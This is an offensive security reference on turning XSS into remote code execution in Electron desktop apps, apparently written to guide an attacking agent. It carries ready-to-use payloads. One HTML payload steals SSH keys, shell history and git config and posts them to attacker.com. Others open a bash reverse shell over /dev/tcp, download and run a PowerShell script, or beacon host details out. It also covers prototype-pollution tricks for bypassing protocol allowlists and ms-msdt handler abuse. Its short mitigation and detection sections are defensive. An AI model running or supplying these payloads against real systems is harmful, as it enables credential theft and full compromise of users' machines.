# 49 - Electron XSS-to-RCE Deep Dive

## Overview

Electron desktop applications bundle Chromium with Node.js, creating a unique attack surface where XSS vulnerabilities can escalate to full Remote Code Execution (RCE). This document covers the latest Electron-specific vulnerabilities, bypass techniques, and exploitation chains relevant to 2024-2026 research.

**Sources:**
- [CVE-2026-40322 - SiYuan Stored XSS to RCE](https://www.thehackerwire.com/siyuan-stored-xss-to-rce-cve-2026-40322/)
- [CVE-2026-70601 - Electron contextBridge Promise Bypass](https://releasealert.dev/cve/CVE-2026-70601)
- [HackTricks - Electron contextIsolation RCE via Preload](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/electron-contextisolation-rce-via-preload-code.md)
- [CVE-2025-56459 - OPCConnect XSS to RCE](https://medium.com/@hackerjedi2812/cve-2025-56459-f814005f607a)
- [CVE-2023-23623 - Electron CSP sandbox bypass](https://vulnerabilities.etecs.ru/vendors/electronjs)
- [Electron Security Tutorial](https://www.electronjs.org/docs/latest/tutorial/security)

---

## 1. Electron Security Model and Defaults

### 1.1 nodeIntegration / contextIsolation Defaults

Electron's security posture has evolved across versions:

| Electron Version | nodeIntegration | contextIsolation | sandbox |
|-----------------|-----------------|------------------|---------|
| < 5.0.0 | `true` (default) | `false` (default) | `false` |
| 5.0.0+ | `false` (default) | `false` (default) | `false` |
| 12.0.0+ | `false` (default) | `true` (default) | `false` |
| 20.0.0+ | `false` (default) | `true` (default) | `true` (default) |

**Despite these secure defaults, many applications override them.** The 2026 SiYuan CVE (CVE-2026-40322) proves that apps continue shipping with `nodeIntegration: true` and `contextIsolation: false`.

### 1.2 How nodeIntegration Enables RCE

When `nodeIntegration: true`, the renderer process has direct access to Node.js APIs:

```javascript
// BrowserWindow configuration that enables RCE from XSS:
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,        // Grants Node.js API access
    contextIsolation: false,      // Shares context with preload
    sandbox: false,               // No process sandboxing
    webSecurity: false            // Optional: disables SOP (even worse)
  }
});
```

When XSS is achieved in this configuration:
```javascript
// Direct system command execution
require('child_process').execSync('whoami');

// File system access
require('fs').readFileSync('/etc/passwd', 'utf8');

// Process information
require('os').hostname();
require('os').userInfo();
```

---

## 2. CVE-2026-70601 -- contextBridge Promise Bypass

### 2.1 Vulnerability Details

**Affected Versions:** Electron 39.0.0 - 39.8.8, 40.0.0 - 40.9.1, 41.0.0 - 41.2.1, 42.0.0-beta.1 - 42.0.0-beta.4
**Fixed In:** 39.8.9, 40.9.2, 41.2.2, 42.0.0-beta.5
**Impact:** Context isolation bypass via Promise-returning contextBridge functions

### 2.2 Technical Analysis

The vulnerability exists in how `contextBridge.exposeInMainWorld()` handles Promise-returning functions. When an exposed function returns a Promise, the Promise object inadvertently leaks a reference from the isolated preload context to the renderer's web context.

**Vulnerable preload pattern:**
```javascript
// preload.js -- exposes async functions via contextBridge
const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('electronAPI', {
  // Any function that returns a Promise is vulnerable
  fetchData: () => ipcRenderer.invoke('fetch-data'),
  getConfig: () => ipcRenderer.invoke('get-config'),
  runTask: (task) => ipcRenderer.invoke('run-task', task)
});
```

**Exploitation concept:**
```javascript
// In the renderer (web content):
// 1. Call the exposed async function to obtain a Promise
const promise = window.electronAPI.fetchData();

// 2. The Promise's internal slots reference objects in the isolated context
// 3. Traverse the prototype chain to reach the isolated world's Function constructor
// 4. Use the leaked Function constructor to evaluate code in the preload context
// 5. From the preload context, access ipcRenderer without contextBridge mediation

// Exploitation flow (conceptual):
// promise.then() -> callback in isolated context -> prototype chain traversal
// -> isolated Function constructor -> eval in preload context
// -> require('child_process').exec('malicious_command')
```

### 2.3 Detection

Check if an Electron app is vulnerable:
1. Extract `app.asar` and review preload scripts
2. Look for `contextBridge.exposeInMainWorld()` calls
3. Identify any exposed function that returns a Promise or uses `ipcRenderer.invoke()`
4. Check the Electron version against affected ranges

```bash
# Extract and inspect Electron app
npx asar extract app.asar extracted/
grep -r "contextBridge.exposeInMainWorld" extracted/
grep -r "ipcRenderer.invoke" extracted/
# Check Electron version
grep -i "electron" extracted/package.json
```

### 2.4 Mitigation

- Update to patched Electron versions (39.8.9+, 40.9.2+, 41.2.2+, 42.0.0-beta.5+)
- Minimize the number of functions exposed via contextBridge
- Avoid exposing generic or overly powerful IPC handlers
- Validate all IPC channel names and arguments in the main process

---

## 3. CVE-2026-40322 -- SiYuan Note-Taking App XSS to RCE

### 3.1 Vulnerability Details

**Application:** SiYuan (open-source note-taking app with 30k+ GitHub stars)
**Affected Versions:** SiYuan <= 3.6.3
**CVSS:** 9.0 (Critical)
**Root Cause:** Stored XSS in note content rendered in Electron with `nodeIntegration: true` and `contextIsolation: false`

### 3.2 Attack Chain

1. Attacker creates a note with embedded HTML/JavaScript (Markdown rendering allows HTML)
2. The note content is stored server-side
3. When any user opens the note, the content renders in Electron's renderer process
4. Due to `nodeIntegration: true`, injected JavaScript has full Node.js access
5. The attacker achieves arbitrary command execution

### 3.3 Exploitation Payloads

```html
<!-- Basic RCE PoC -->
<img src=x onerror="require('child_process').execSync('id > /tmp/rce_proof')">

<!-- Exfiltrate sensitive files -->
<img src=x onerror="
  var fs = require('fs');
  var os = require('os');
  var home = os.homedir();
  var data = {};
  try { data.sshKey = fs.readFileSync(home + '/.ssh/id_rsa', 'utf8'); } catch(e) {}
  try { data.bashHistory = fs.readFileSync(home + '/.bash_history', 'utf8').slice(-5000); } catch(e) {}
  try { data.gitConfig = fs.readFileSync(home + '/.gitconfig', 'utf8'); } catch(e) {}
  fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)});
">

<!-- Reverse shell -->
<div onmouseover="
  require('child_process').exec(
    'bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"'
  );
">View attachment</div>

<!-- Windows variant -->
<img src=x onerror="
  require('child_process').exec(
    'powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"https://attacker.com/ps.ps1\\\")\"'
  );
">
```

### 3.4 Shared/Collaborative Note Exploitation

SiYuan supports syncing and sharing notes. The attack is particularly dangerous in collaborative scenarios:
- Attacker shares a malicious note to a workspace
- All users who open the note are compromised
- The stored nature means the payload persists and re-fires

---

## 4. shell.openExternal Exploitation

### 4.1 Attack Surface

`shell.openExternal()` is an Electron API that opens URLs or files using the system's default handler. When exposed to renderer content (via preload or IPC), it becomes an RCE vector.

### 4.2 Exploitation Patterns

```javascript
// Discovery: Check if shell.openExternal is accessible
// Look for exposed APIs in the renderer:
console.log(window.electronAPI);
console.log(window.api);

// Pattern 1: Direct file execution (Linux)
window.electronAPI.openExternal('file:///usr/bin/gnome-terminal');

// Pattern 2: Command execution via shell scripts
// First, write a script via another exposed API or file upload
window.electronAPI.openExternal('file:///tmp/malicious.sh');

// Pattern 3: macOS - AppleScript execution
window.electronAPI.openExternal(
  'applescript://com.apple.scripteditor?action=new&script=do%20shell%20script%20%22whoami%22'
);

// Pattern 4: Windows - Protocol handler abuse
window.electronAPI.openExternal('ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebsrowseForFile=?IT_LaunchMethod=ContextMenu IT_SelectProgram=NotePad IT_BrowseForFile=h]$(calc)i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"');

// Pattern 5: Custom protocol handlers
// Many Electron apps register custom protocols (myapp://)
// These can be exploited if they pass data to shell commands
```

### 4.3 Mitigation

Applications should validate URLs passed to `shell.openExternal()`:
```javascript
// SAFE: Validate URL before opening
const { shell } = require('electron');
const { URL } = require('url');

function safeOpenExternal(urlString) {
  try {
    const url = new URL(urlString);
    // Only allow http and https protocols
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      return false;
    }
    // Optional: domain allowlist
    const allowedDomains = ['docs.example.com', 'support.example.com'];
    if (!allowedDomains.includes(url.hostname)) {
      return false;
    }
    shell.openExternal(urlString);
    return true;
  } catch (e) {
    return false;
  }
}
```

---

## 5. Array.prototype.indexOf Override (Protocol Allowlist Bypass)

### 5.1 Technique

When `contextIsolation` is disabled, the renderer's JavaScript context is shared with the preload script. This allows prototype pollution attacks that bypass security checks in preload code.

### 5.2 How It Works

Many preload scripts use `Array.prototype.indexOf()` to check if a URL's protocol is in an allowlist:

```javascript
// Preload script -- protocol validation
const allowedProtocols = ['https:', 'http:'];

ipcRenderer.on('open-url', (event, url) => {
  const parsed = new URL(url);
  if (allowedProtocols.indexOf(parsed.protocol) === -1) {
    return; // Block non-allowed protocols
  }
  shell.openExternal(url);
});
```

The attacker overrides `indexOf()` from the renderer context:
```javascript
// Override indexOf to always return 0 (found)
Array.prototype.indexOf = function() { return 0; };

// Now ANY protocol passes the check:
// allowedProtocols.indexOf('file:') returns 0 instead of -1
// allowedProtocols.indexOf('data:') returns 0 instead of -1

// Trigger the IPC handler with a dangerous protocol
window.electronAPI.openUrl('file:///etc/passwd');
```

### 5.3 Extended Prototype Pollution Techniques

```javascript
// Override other methods used for validation
Array.prototype.includes = function() { return true; };
String.prototype.startsWith = function() { return true; };
String.prototype.endsWith = function() { return true; };

// Override JSON.parse to inject properties
var origParse = JSON.parse;
JSON.parse = function(str) {
  var obj = origParse(str);
  obj.isAdmin = true;
  obj.permissions = ['admin', 'write', 'execute'];
  return obj;
};

// Override URL constructor to fake protocol
var OrigURL = URL;
URL = function(urlStr) {
  var u = new OrigURL(urlStr);
  Object.defineProperty(u, 'protocol', { get: function() { return 'https:'; }});
  return u;
};
```

---

## 6. Testing Methodology for Electron XSS-to-RCE

### 6.1 Reconnaissance

```bash
# 1. Extract app.asar
npx asar extract /path/to/app.asar ./extracted

# 2. Check Electron version
cat extracted/package.json | grep -i electron

# 3. Find BrowserWindow configurations
grep -rn "new BrowserWindow" extracted/
grep -rn "nodeIntegration" extracted/
grep -rn "contextIsolation" extracted/
grep -rn "sandbox" extracted/
grep -rn "webSecurity" extracted/

# 4. Find preload scripts
grep -rn "preload" extracted/

# 5. Find contextBridge usage
grep -rn "contextBridge" extracted/
grep -rn "exposeInMainWorld" extracted/

# 6. Find shell.openExternal usage
grep -rn "shell.openExternal" extracted/

# 7. Find IPC handlers
grep -rn "ipcMain.handle" extracted/
grep -rn "ipcMain.on" extracted/

# 8. Find custom protocol handlers
grep -rn "protocol.registerHttpProtocol" extracted/
grep -rn "protocol.registerFileProtocol" extracted/
```

### 6.2 Exploitation Decision Tree

```
XSS in Electron App
|
+-- nodeIntegration: true?
|   |
|   +-- YES -> Direct RCE via require('child_process')
|   |
|   +-- NO -> Check contextIsolation
|       |
|       +-- contextIsolation: false?
|       |   |
|       |   +-- YES -> Prototype pollution to hijack preload functions
|       |   |          Override Array.prototype.indexOf for allowlist bypass
|       |   |
|       |   +-- NO -> Check Electron version for contextBridge bypass
|       |       |
|       |       +-- Electron 39-42? -> CVE-2026-70601 Promise bypass
|       |       |
|       |       +-- Newer? -> Enumerate exposed contextBridge APIs
|       |                     Look for overly permissive IPC handlers
|       |                     Check shell.openExternal exposure
|       |
+-- sandbox: false?
    |
    +-- YES -> CSP may not be enforced (CVE-2023-23623)
    +-- NO -> Check for file:// or custom protocol access
```

---

## 7. Ready-to-Use Payloads

### Payload 1: Electron RCE Discovery + Execution
```javascript
// Detect Electron environment and attempt RCE
(function(){
  try {
    if (typeof require !== 'undefined') {
      // nodeIntegration enabled
      var info = require('os').hostname() + '|' + require('os').userInfo().username;
      require('child_process').execSync('curl https://attacker.com/rce?info=' + encodeURIComponent(info));
    } else if (window.process && window.process.versions && window.process.versions.electron) {
      // Electron detected but require not directly available
      // Try prototype pollution or contextBridge abuse
      fetch('https://attacker.com/electron-detected', { mode: 'no-cors' });
    }
  } catch(e) {
    fetch('https://attacker.com/electron-error?e=' + encodeURIComponent(e.message), { mode: 'no-cors' });
  }
})();
```

### Payload 2: Comprehensive Electron Enumeration
```javascript
(function(){
  var report = {
    hasRequire: typeof require !== 'undefined',
    hasProcess: typeof process !== 'undefined',
    electronVersion: (typeof process !== 'undefined' && process.versions) ? process.versions.electron : 'N/A',
    nodeVersion: (typeof process !== 'undefined' && process.versions) ? process.versions.node : 'N/A',
    exposedAPIs: Object.keys(window).filter(function(k) {
      return typeof window[k] === 'object' && window[k] !== null &&
        !['location','navigator','console','document','performance','screen','history'].includes(k);
    }),
    platform: (typeof process !== 'undefined') ? process.platform : navigator.platform
  };
  navigator.sendBeacon('https://attacker.com/electron-enum', JSON.stringify(report));
})();
```

### Payload 3: Prototype Pollution Chain (contextIsolation: false)
```javascript
// Override indexOf to bypass protocol checks, then trigger shell.openExternal
Array.prototype.indexOf = function(){ return 0; };
String.prototype.includes = function(){ return true; };
// Trigger the preload's URL opening function
if (window.api && window.api.openLink) {
  window.api.openLink('file:///etc/passwd');
} else if (window.electronAPI && window.electronAPI.openExternal) {
  window.electronAPI.openExternal('file:///etc/passwd');
}
```

---

## 8. Key Takeaways for Agent Decision Logic

| Scenario | Exploitation Path | CVE Reference |
|----------|-------------------|---------------|
| nodeIntegration: true | Direct `require('child_process')` | CVE-2026-40322 (SiYuan) |
| contextIsolation: false | Prototype pollution -> preload hijack | Multiple |
| contextBridge + Promise functions (Electron 39-42) | Promise context leak -> isolated world access | CVE-2026-70601 |
| shell.openExternal exposed | File/protocol handler execution | CVE-2025-56459 (OPCConnect) |
| sandbox: false + CSP | CSP policy not enforced in renderer | CVE-2023-23623 |
| Custom protocol handlers | Unsanitized data to renderer process | Various |
